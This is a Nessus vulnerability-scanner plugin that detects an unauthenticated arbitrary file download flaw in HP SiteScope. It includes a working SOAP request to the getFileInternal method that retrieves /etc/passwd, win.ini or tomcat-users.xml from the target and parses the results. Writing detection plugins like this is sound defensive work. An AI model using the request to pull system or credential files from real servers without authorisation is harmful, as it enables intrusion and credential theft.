#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62099);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2016/12/21 22:04:46 $");

  script_bugtraq_id(55269);
  script_osvdb_id(85119);

  script_name(english:"HP SiteScope getFileInternal Arbitrary File Download");
  script_summary(english:"Tries to download a file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host has an arbitrary file download
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of HP SiteScope hosted on the remote web server has an
arbitrary file download vulnerability.  The application hosts a web
service that allows the getFileInternal() method to be invoked without
authentication.  A remote, unauthenticated attacker could exploit this
to download arbitrary files.

This software has other unpatched vulnerabilities, though Nessus has
not checked for those issues."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-12-176/");
  # http://h20566.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c03489683
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2b8dddf2");
  script_set_attribute(attribute:"solution", value:
"For versions 11.10, 11.11, and 11.12, upgrade to SiteScope 11.13. 
After upgrading, disable the vulnerable API by adding
'_disableOldAPIs=true' to the master.config file. 

For version 11.20, contact HP Software Support Online for patches."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"HP SiteScope 11.20 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'HP SiteScope Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/08/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/09/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/09/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:mercury_sitescope");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("hp_sitescope_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/sitescope");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

WIN_FILE = 'c:\\windows\\win.ini';
UNIX_FILE = '/etc/passwd';
SS_FILE = 'Tomcat/conf/tomcat-users.xml';
patterns[WIN_FILE] = '=MPEGVideo';
patterns[UNIX_FILE] = 'root:.*:0:[01]:';
patterns[SS_FILE] = '<tomcat-users>';

port = get_http_port(default:8080);
install = get_install_from_kb(appname:'sitescope', port:port, exit_on_fail:TRUE);

if (report_paranoia < 2 && (os = get_kb_item('Host/OS')))
{
  if ('Windows' >< os)
    files = make_list(WIN_FILE, SS_FILE);
  else
    files = make_list(UNIX_FILE, SS_FILE);
}
else
{
  files = make_list(WIN_FILE, UNIX_FILE, SS_FILE);
}

hdr = make_array('SOAPAction', '""');
url = install['dir'] + '/services/APISiteScopeImpl';
file_contents = NULL;

foreach file (files)
{
  xml = '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope
 xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soapenv:Body>
    <ns1:getFileInternal
     soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
     xmlns:ns1="http://Api.freshtech.COM">
       <in0 xsi:type="xsd:string">127.0.0.1</in0>
       <in1 xsi:type="xsd:string">' + file + '</in1>
    </ns1:getFileInternal>
  </soapenv:Body>
</soapenv:Envelope>';

  res = http_send_recv3(
    method:'POST',
    item:url,
    port:port,
    data:xml,
    add_headers:hdr,
    content_type:'text/xml; charset=utf-8',
    exit_on_fail:TRUE
  );
  poc = http_last_sent_request();
  
  headers = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(headers)) continue;
  
  match = eregmatch(string:headers['content-type'], pattern:'boundary="([^"]+)"');
  boundary = match[1];
  if (isnull(boundary)) continue;
  
  match = eregmatch(string:res[2], pattern:'getFileInternalReturn href="cid:([^"]+)"');
  cid = match[1];
  if (isnull(cid)) continue;
  
  file_contents = split(res[2], sep:'<' + cid + '>\r\n\r\n', keep:FALSE);
  file_contents = file_contents[1];
  file_contents = split(file_contents, sep:'\r\n--' + boundary, keep:FALSE);
  file_contents = substr(file_contents[0], 10);
  file_contents = zlib_decompress(data:file_contents, length:2048);
 
  if (!isnull(file_contents) && file_contents =~ patterns[file])
    break;
  else
    file_contents = NULL;
}

if (isnull(file_contents))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'SiteScope', build_url(qs:install['dir'], port:port));

if (report_verbosity > 0)
{
  report =
    '\nNessus requested "' + file + '" :\n\n' +
    poc +
    '\n\nWhich returned the following file contents :\n\n' +
    file_contents + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);
